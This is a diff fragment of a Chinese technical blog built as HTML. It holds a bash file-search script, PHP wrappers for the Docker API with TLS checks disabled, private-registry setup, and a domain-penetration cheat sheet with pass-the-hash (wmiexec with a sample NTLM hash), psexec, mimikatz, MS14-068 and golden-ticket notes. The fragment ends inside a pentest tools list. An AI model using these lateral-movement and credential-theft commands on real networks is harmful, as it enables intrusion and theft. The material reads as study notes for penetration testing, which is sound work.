+        <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo $*</span><br><span class="line">if [ $# == 0 ];</span><br><span class="line">then</span><br><span class="line">    echo &#x27;-h获取帮助&#x27;;</span><br><span class="line">    exit</span><br><span class="line">elif [ $1 = &#x27;-h&#x27; ];</span><br><span class="line">then</span><br><span class="line">    echo &#x27;search使用说明:先输入-p 后面加路径，再输入-f后面加搜索的文件&#x27;;</span><br><span class="line"></span><br><span class="line">elif [ $1 ] &amp;&amp; [ $3 ] &amp;&amp; [ $1 = &#x27;-p&#x27; ] &amp;&amp; [ $3 = &#x27;-f&#x27; ]; </span><br><span class="line">then</span><br><span class="line">    echo &quot;files:&quot;</span><br><span class="line">    find $2/ -iregex &quot;.*$4.*&quot;</span><br><span class="line">    count=$(find $2/ -iregex &quot;.*$4.*&quot; |wc -l)</span><br><span class="line">    echo &quot;count:$count&quot;;</span><br><span class="line">else</span><br><span class="line">    echo &quot;请检查输入是否正确&quot;;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/03/24/first-shell/" data-id="ckgg5oe0i0008zov25focekdt" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shell-%E8%84%9A%E6%9C%AC-Linux-search/" rel="tag">shell 脚本 Linux search</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-docker-api" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/24/docker-api/" class="article-date">
+  <time datetime="2019-03-24T08:29:01.000Z" itemprop="datePublished">2019-03-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/24/docker-api/">php与docker-api与私有仓库</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="1-封装的方法："><a href="#1-封装的方法：" class="headerlink" title="1.封装的方法："></a>1.封装的方法：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CreateURL</span>(<span class="params">$image_name,$apache_port,$hostname=<span class="string">&#x27;test&#x27;</span>,$Volumes=<span class="string">&#x27;&#123;&quot;/var/lib/docker/volumes/de96b8143c2808ead5cb9dda7ad69f5b8024cae0e4b364a7cef7adf7f387dd89/_data&quot;: &#123;&quot;/var/lib/mysql&quot;:&quot;rw&quot; &#125;&#125;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">#$data  = json_encode($data);    </span></span><br><span class="line">        $data=<span class="string">&#x27;&#123;&quot;Image&quot;:&quot;&#x27;</span>.$image_name.<span class="string">&#x27;&quot;,&quot;Hostname&quot;:&quot;&#x27;</span>.$hostname.<span class="string">&#x27;&quot;,&quot;Volumes&quot;:&#x27;</span>.$Volumes.<span class="string">&#x27;,&quot;ExposedPorts&quot;:&#123;&quot;80/tcp&quot;:&#123;&#125; &#125;,&quot;PortBindings&quot;:&#123;&quot;80/tcp&quot;:[&#123;&quot;HostPort&quot;:&quot;&#x27;</span>.$apache_port.<span class="string">&#x27;&quot;&#125;] &#125;,&quot;StopTimeout&quot;: 1     &#125;&#x27;</span>;</span><br><span class="line">        $url = <span class="string">&#x27;http://&#x27;</span>.$_SERVER[SERVER_ADDR].<span class="string">&#x27;:5555/containers/create&#x27;</span>;</span><br><span class="line">        $headerArray =<span class="keyword">array</span>(<span class="string">&quot;Content-type:application/json;charset=&#x27;utf-8&#x27;&quot;</span>,<span class="string">&quot;Accept:application/json&quot;</span>);</span><br><span class="line">        $curl = curl_init();</span><br><span class="line">        curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST,<span class="literal">FALSE</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);</span><br><span class="line">        curl_setopt($curl,CURLOPT_HTTPHEADER,$headerArray);</span><br><span class="line">        curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($curl);</span><br><span class="line">        curl_close($curl);</span><br><span class="line">        <span class="keyword">return</span> json_decode($output);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">StartContainer</span>(<span class="params">$id</span>)</span>&#123;</span><br><span class="line">        $url = <span class="string">&#x27;http://&#x27;</span>.$_SERVER[SERVER_ADDR].<span class="string">&#x27;:5555/containers/&#x27;</span>.$id.<span class="string">&#x27;/start&#x27;</span>;</span><br><span class="line">        $headerArray =<span class="keyword">array</span>(<span class="string">&quot;Content-type:application/json;charset=&#x27;utf-8&#x27;&quot;</span>,<span class="string">&quot;Accept:application/json&quot;</span>);</span><br><span class="line">        $curl = curl_init();</span><br><span class="line">        curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST,<span class="literal">FALSE</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">#curl_setopt($curl, CURLOPT_POSTFIELDS, $data);</span></span><br><span class="line">        curl_setopt($curl,CURLOPT_HTTPHEADER,$headerArray);</span><br><span class="line">        curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($curl);</span><br><span class="line">        curl_close($curl);</span><br><span class="line">        <span class="keyword">return</span> json_decode($output);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">StopContainer</span>(<span class="params">$id</span>)</span>&#123;</span><br><span class="line">        <span class="comment">#$data  = json_encode($data);</span></span><br><span class="line">        $url = <span class="string">&#x27;http://&#x27;</span>.$_SERVER[SERVER_ADDR].<span class="string">&#x27;:5555/containers/&#x27;</span>.$id.<span class="string">&#x27;/stop?t=1&#x27;</span>;</span><br><span class="line">        $headerArray =<span class="keyword">array</span>(<span class="string">&quot;Content-type:application/json;charset=&#x27;utf-8&#x27;&quot;</span>,<span class="string">&quot;Accept:application/json&quot;</span>);</span><br><span class="line">        $curl = curl_init();</span><br><span class="line">        curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST,<span class="literal">FALSE</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">#curl_setopt($curl, CURLOPT_POSTFIELDS, $data);</span></span><br><span class="line">        curl_setopt($curl,CURLOPT_HTTPHEADER,$headerArray);</span><br><span class="line">        curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($curl);</span><br><span class="line">        $httpCode = curl_getinfo($curl,CURLINFO_HTTP_CODE); </span><br><span class="line">        curl_close($curl);</span><br><span class="line">        <span class="keyword">return</span> $httpCode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RmContainer</span>(<span class="params">$id</span>)</span>&#123;</span><br><span class="line">        $url = <span class="string">&#x27;http://&#x27;</span>.$_SERVER[SERVER_ADDR].<span class="string">&#x27;:5555/containers/&#x27;</span>.$id;</span><br><span class="line">        <span class="comment">#$data  = json_encode($data);</span></span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt ($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt ($ch, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">&#x27;Content-type:application/json&#x27;</span>));</span><br><span class="line">        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt ($ch, CURLOPT_CUSTOMREQUEST, <span class="string">&quot;DELETE&quot;</span>);   </span><br><span class="line">        <span class="comment">#curl_setopt($ch, CURLOPT_POSTFIELDS,$data);</span></span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        $output = json_decode($output,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RenameContainer</span>(<span class="params">$id,$username</span>)</span>&#123;</span><br><span class="line">        <span class="comment">#$data  = json_encode($data);</span></span><br><span class="line">        $url = <span class="string">&#x27;http://&#x27;</span>.$_SERVER[SERVER_ADDR].<span class="string">&#x27;:5555/containers/&#x27;</span>.$id.<span class="string">&#x27;/rename?name=&#x27;</span>.$username;</span><br><span class="line">        $headerArray =<span class="keyword">array</span>(<span class="string">&quot;Content-type:application/json;charset=&#x27;utf-8&#x27;&quot;</span>,<span class="string">&quot;Accept:application/json&quot;</span>);</span><br><span class="line">        $curl = curl_init();</span><br><span class="line">        curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST,<span class="literal">FALSE</span>);</span><br><span class="line">        curl_setopt($curl, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">#curl_setopt($curl, CURLOPT_POSTFIELDS, $data);</span></span><br><span class="line">        curl_setopt($curl,CURLOPT_HTTPHEADER,$headerArray);</span><br><span class="line">        curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($curl);</span><br><span class="line">        $httpCode = curl_getinfo($curl,CURLINFO_HTTP_CODE); </span><br><span class="line">        curl_close($curl);</span><br><span class="line">        <span class="comment">#return json_decode($output);</span></span><br><span class="line">        <span class="keyword">return</span> $httpCode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_url</span>(<span class="params">$apache_port</span>)</span>&#123;</span><br><span class="line">        $url=<span class="string">&quot;http://&quot;</span>.$_SERVER[SERVER_ADDR].<span class="string">&quot;:&quot;</span>.$apache_port;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;&lt;a href=&quot;</span>.$url.<span class="string">&quot; &quot;</span>. <span class="string">&quot;target=&#x27;_blank&#x27;&gt;打开习题&lt;/a&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;习题页面<span class="subst">$url</span>&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h2><table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>$id = CreateURL($image_name,$apache_port)-&gt;Id</code></td>
+<td>创建容器 201创建成功 404无容器     $id为容器id</td>
+</tr>
+<tr>
+<td align="left"><code>StartContainer($id)</code></td>
+<td>开启容器 204成功 304已经开启 404无容器</td>
+</tr>
+<tr>
+<td align="left"><code>RenameContainer($id,$username)</code></td>
+<td>重命名   204成功 404无容器</td>
+</tr>
+<tr>
+<td align="left"><code>StopContainer(容器id/名称)</code></td>
+<td>停止容器 204成功 304已经停止 404无容器</td>
+</tr>
+<tr>
+<td align="left"><code>RmContainer(容器id/名称);</code></td>
+<td>删除容器 200成功</td>
+</tr>
+</tbody></table>
+<h2 id="3-搭建私有容器仓库："><a href="#3-搭建私有容器仓库：" class="headerlink" title="3.搭建私有容器仓库："></a>3.搭建私有容器仓库：</h2><h4 id="01-拉取仓库镜像"><a href="#01-拉取仓库镜像" class="headerlink" title="01.拉取仓库镜像"></a>01.拉取仓库镜像</h4><pre><code>`docker pull registry`</code></pre>
+<h4 id="02-配置https支持"><a href="#02-配置https支持" class="headerlink" title="02.配置https支持"></a>02.配置https支持</h4><pre><code>`vim /etc/docker/daemon.json`</code></pre>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="attr">&quot;insecure-registries&quot;</span>:[<span class="string">&quot;9.1.1.128:5000&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">或vim/etc/default/docker</span><br><span class="line">添加 &quot;- - insecure-registry 127.0.0.1:5000&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="03-启动仓库服务"><a href="#03-启动仓库服务" class="headerlink" title="03.启动仓库服务"></a>03.启动仓库服务</h4><pre><code>`sudo vi /data/docker/config.yml`</code></pre>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="number">0.1</span></span><br><span class="line"><span class="attr">log:</span></span><br><span class="line">  <span class="attr">fields:</span></span><br><span class="line">    <span class="attr">service:</span> <span class="string">registry</span></span><br><span class="line"><span class="attr">storage:</span></span><br><span class="line">  <span class="attr">delete:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">blobdescriptor:</span> <span class="string">inmemory</span></span><br><span class="line">  <span class="attr">filesystem:</span></span><br><span class="line">    <span class="attr">rootdirectory:</span> <span class="string">/var/lib/registry</span></span><br><span class="line"><span class="attr">http:</span></span><br><span class="line">  <span class="attr">addr:</span> <span class="string">:5000</span></span><br><span class="line">  <span class="attr">headers:</span></span><br><span class="line">    <span class="attr">X-Content-Type-Options:</span> [<span class="string">nosniff</span>]</span><br><span class="line"><span class="attr">health:</span></span><br><span class="line">  <span class="attr">storagedriver:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="string">10s</span></span><br><span class="line">    <span class="attr">threshold:</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>
+<pre><code>`docker run -d -p 5000:5000 -v /data/docker/registry:/var/lib/registry  -v /data/docker/config.yml:/etc/docker/registry/config.yml --restart always --name registry registry`</code></pre>
+<h4 id="04-搭建完仓库，开始配置镜像"><a href="#04-搭建完仓库，开始配置镜像" class="headerlink" title="04.搭建完仓库，开始配置镜像"></a>04.搭建完仓库，开始配置镜像</h4><pre><code>` docker tag image_name:tags  ip:5000/image_name`</code></pre>
+<h4 id="05-推送到本地"><a href="#05-推送到本地" class="headerlink" title="05.推送到本地"></a>05.推送到本地</h4><pre><code>`docker push ip:5000/image_name`</code></pre>
+<h4 id="06-查看仓库内镜像"><a href="#06-查看仓库内镜像" class="headerlink" title="06.查看仓库内镜像"></a>06.查看仓库内镜像</h4><pre><code>`curl http://ip:5000/v2/_catalog`     
+`curl  &lt;仓库地址&gt;/v2/&lt;镜像名&gt;/tags/list`   查看镜像版本
+`curl --header &quot;Accept:application/vnd.docker.distribution.manifest.v2+json&quot; -I -XGET http://镜像地址/v2/镜像名称/manifests/镜像版本` 查看hash，注意url前只能有一个空格</code></pre>
+<h4 id="07-从仓库拉取镜像"><a href="#07-从仓库拉取镜像" class="headerlink" title="07.从仓库拉取镜像"></a>07.从仓库拉取镜像</h4><pre><code>`docker pull ip:5000/image_name`</code></pre>
+<h4 id="08-删除仓库镜像"><a href="#08-删除仓库镜像" class="headerlink" title="08.删除仓库镜像"></a>08.删除仓库镜像</h4><pre><code>正常情况：`curl -I -XDELETE 私有仓库地址/v2/镜像名称/manifests/镜像对应sha256值`，如果不好用的话：
+001进入容器：`docker exec -it registry sh`
+002查看是否开启了删除数据功能：`cat /etc/docker/registry/config.yml`delete值为`true`
+003找到要删除的镜像：`find . -name &quot;*elasticsearch*&quot;`
+004手动删除：`rm -r ./var/lib/registry/docker/registry/v2/repositories/elasticsearch`
+005删后同步registry/config.yml文件：`registry garbage-collect /etc/docker/registry/config.yml`
+006等待完成后再次查看镜像：`http://localhost:5000/v2/_catalog`</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/03/24/docker-api/" data-id="ckgg5oe0f0005zov2dgweeua1" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/docker-api-php-registry/" rel="tag">docker-api,php,registry</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-域渗透" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/24/%E5%9F%9F%E6%B8%97%E9%80%8F/" class="article-date">
+  <time datetime="2019-03-24T08:29:01.000Z" itemprop="datePublished">2019-03-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/24/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="一。搭建域环境："><a href="#一。搭建域环境：" class="headerlink" title="一。搭建域环境："></a>一。搭建域环境：</h2><p>作用：批量控制</p>
+<h4 id="1-域控制器的配置："><a href="#1-域控制器的配置：" class="headerlink" title="1.域控制器的配置："></a>1.域控制器的配置：</h4><p>服务器管理器-&gt;添加角色-&gt;勾选域服务-&gt;下一步-&gt;安装<br>运行-&gt;dcpromo启动域安装程序-&gt;创建一个”林”-&gt;命名-&gt;林功能级别”默认”-&gt;一直下一步-&gt;设置域控密码-&gt;一直下一步-&gt;重启。</p>
+<h4 id="2-把主机加入域控："><a href="#2-把主机加入域控：" class="headerlink" title="2.把主机加入域控："></a>2.把主机加入域控：</h4><p>​    计算机属性-&gt;更改域设置-&gt;隶属于-&gt;在域控中选择users-&gt;点右键，新建用户-&gt;注意用户名和密码<br>​    注意：需要防火墙通过域网络</p>
+<h2 id="二。了解域"><a href="#二。了解域" class="headerlink" title="二。了解域"></a>二。了解域</h2><h4 id="1-关键词："><a href="#1-关键词：" class="headerlink" title="1.关键词："></a>1.关键词：</h4><ul>
+<li><p>域控</p>
+</li>
+<li><p>域主机</p>
+</li>
+<li><p>域管理员：administrator  可以登陆域中任意一台主机</p>
+</li>
+<li><p>域账户：域控创建的“网络账户”   远程桌面禁止登陆        <em>默认情况下也可以登陆所有的主机</em>       域用户查看等命令只有用域账户登陆才能执行</p>
+</li>
+<li><p>本地账户：原有账户</p>
+</li>
+</ul>
+<h4 id="2-域的操作命令"><a href="#2-域的操作命令" class="headerlink" title="2.域的操作命令"></a>2.域的操作命令</h4><ul>
+<li>ipconfig/all可以查看是否在域中、</li>
+<li>ping 域名可以获取域控的ip地址</li>
+<li>et user “domain controllers” /domain 查询域控ip</li>
+<li>net user /domain 查看域中的用户</li>
+<li>dsquery  user                   #查看域控域所有域用户详细信息</li>
+<li>dsquery    server               #查看所有域控制器</li>
+<li>net  localgroup  administrators  zhuyu\test  /add     #把zhuyu域控域用户test添加到本地管理员组</li>
+<li>net view #查看域中的主机</li>
+<li>nte view/domain #查看所有域</li>
+</ul>
+<h2 id="三。域渗透大体方式"><a href="#三。域渗透大体方式" class="headerlink" title="三。域渗透大体方式"></a>三。域渗透大体方式</h2><h4 id="1-域中的远程磁盘映射"><a href="#1-域中的远程磁盘映射" class="headerlink" title="1.域中的远程磁盘映射"></a>1.域中的远程磁盘映射</h4><p><code>net use H: \\ip\c$ &quot;password&quot; /user:username</code></p>
+<p>net use H: /D    #删除H磁盘的映射</p>
+<h4 id="2-添加计划任务：net-time-ip-获取系统时间"><a href="#2-添加计划任务：net-time-ip-获取系统时间" class="headerlink" title="2.添加计划任务：net time \ip #获取系统时间"></a>2.添加计划任务：net time \ip #获取系统时间</h4><p>at \ip  10:57:00 /c “commond” #在10点57添加一项计划任务</p>
+<p>at \ip 1 /delete  #删除任务1<br>注意：net use 命令需要administrator用户连接，其他用户不行</p>
+<h4 id="3-工具："><a href="#3-工具：" class="headerlink" title="3.工具："></a>3.工具：</h4><ul>
+<li>psexec #远控工具，通过用户名和密码，直接执行命令</li>
+</ul>
+<p>–accepteula #打开时不弹窗</p>
+<ul>
+<li>wmiexec.exe #远控工具，域中使用</li>
+</ul>
+<p><code>wmiexec -hashes 00000000000000000000000000000000:03bebb338e70244589ea67c7439c77ba TEST/administrator@192.168.0.100 “whoami</code></p>
+<h2 id="四。-攻击具体流程和思路"><a href="#四。-攻击具体流程和思路" class="headerlink" title="四。.攻击具体流程和思路"></a>四。.攻击具体流程和思路</h2><ul>
+<li>获取域账户密码(    获取hash的工具 <code>mimikatz getpasswd pwdump7</code></li>
+</ul>
+<p>  (1)管理员的-&gt;用户名和密码、</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用工具获取hash：&#96;wimexec.exe -hashs ntlm_hash domain&#x2F;uname@ip cmd&#96;</span><br><span class="line">如果获取了明文密码：&#96;net use \\ip\ipc$ &quot;pass&quot; &#x2F;user:uname&#96; 挂载分区，执行命令</span><br><span class="line">&#96;psexec -h ip -u name -p pass cmd &#96;</span><br></pre></td></tr></table></figure>
+
+<p>​    (2)普通用户的-&gt;网站是否存在域控ms14-068漏洞、</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用&#96;wimexec.exe -hashs ntlm_hash domain&#x2F;uname@ip cmd&#96;,普通用户一般没有权限</span><br><span class="line">用&#96;ms14-068漏洞 -u 域成员们@域名 -s 域成员sid -d 域控ip  -p域成员密码&#96;	</span><br></pre></td></tr></table></figure>
+
+
+<p>​            (3)是否存在krbtgt用户-&gt;获取hash就相当于域控***</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果获取了此用户hash&#x3D;&#x3D;黄金票据  直接用mimikatz攻击</span><br></pre></td></tr></table></figure>
+
+
+<p>​            (4)本地账户的-&gt;账户和明文密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">扫描内网ip,有没有使用相同的口令</span><br></pre></td></tr></table></figure>
+
+<p>​<br>​    </p>
+<ul>
+<li>域中其他的主机使用web或ms漏洞攻击</li>
 </ul>
 
-
-        </div>
-        <!-- Sidebar Container -->
-        <div class="
-                col-lg-3 col-lg-offset-0
-                col-md-3 col-md-offset-0
-                col-sm-12
-                col-xs-12
-                sidebar-container
-            ">
-
-            <!-- About Me -->
-            <section class="visible-md visible-lg" style="padding: 0 18px">
-                <div class="short-about">
-                    <!--侧边栏头像-->
-                    
-                    <h5><a href="/about/">pengpengp</a></h5>
-                    
-                    <hr>
-                    <!-- SNS Link 社交 -->
-                    <ul class="list-inline">
-                        
-                        
-                        
-
-                        
-
-                        
-
-                        
-
-                        
-                    </ul>
-                </div>
-            </section>
-
-            <!-- Featured Tags  标签 -->
-            
-
-            
-
-        </div>
+      
     </div>
-</div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/03/24/%E5%9F%9F%E6%B8%97%E9%80%8F/" data-id="ckgg5oe0u0012zov25qowhqui" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows-%E5%9F%9F-%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">windows 域 域渗透</a></li></ul>
 
-<!-- Footer -->
-<!-- Footer -->
-<footer>
-    <div class="container">
-        <div class="row">
-            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
-                <br>
-                <ul class="list-inline text-center">
-                
-                
-                
+    </footer>
+  </div>
+  
+</article>
 
-                
 
-                
+  
+    <article id="post-常用渗透工具" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/16/%E5%B8%B8%E7%94%A8%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" class="article-date">
+  <time datetime="2019-03-16T08:58:09.000Z" itemprop="datePublished">2019-03-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/16/%E5%B8%B8%E7%94%A8%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/">常用渗透工具</a>
+    </h1>
+  
 
-                
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="web测试常用工具整理"><a href="#web测试常用工具整理" class="headerlink" title="web测试常用工具整理:"></a>web测试常用工具整理:</h3><h3 id="一-burpsuite"><a href="#一-burpsuite" class="headerlink" title="一.burpsuite"></a>一.burpsuite</h3><p>1.Macros模块:project-&gt;macros爆破数字验证码:<a target="_blank" rel="noopener" href="https://blog.csdn.net/d_pokemon/article/details/78194351">https://blog.csdn.net/d_pokemon/article/details/78194351</a></p>
+<p> 2.intruder模块四种攻击方式:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Sniper(单字典顺序爆破):常用</span><br><span class="line">battering ram(单字典赋予所有变量取相同值)</span><br><span class="line">pitchfork(双字典同时顺序爆破)</span><br><span class="line">cluster bomb(多字典混合爆破).常用***</span><br></pre></td></tr></table></figure>
 
-                
+<p>3.Proxy代理功能:User options-&gt;socks proxy</p>
+<p>参考:<a target="_blank" rel="noopener" href="https://blog.csdn.net/snert/article/details/49749757(%E7%88%86%E7%A0%B4%E6%95%B0%E5%AD%97%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AE%B2%E8%A7%A3)">https://blog.csdn.net/snert/article/details/49749757(爆破数字验证码讲解)</a><br>    <a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaohua_de/article/details/80290882(%E7%88%86%E7%A0%B4%E6%96%B9%E5%BC%8F%E5%9B%BE%E8%A7%A3)">https://blog.csdn.net/xiaohua_de/article/details/80290882(爆破方式图解)</a></p>
+<h3 id="二-sqlmap参数"><a href="#二-sqlmap参数" class="headerlink" title="二.sqlmap参数"></a>二.sqlmap参数</h3><table>
+<thead>
+<tr>
+<th align="left">命令</th>
+<th>解释</th>
+</tr>
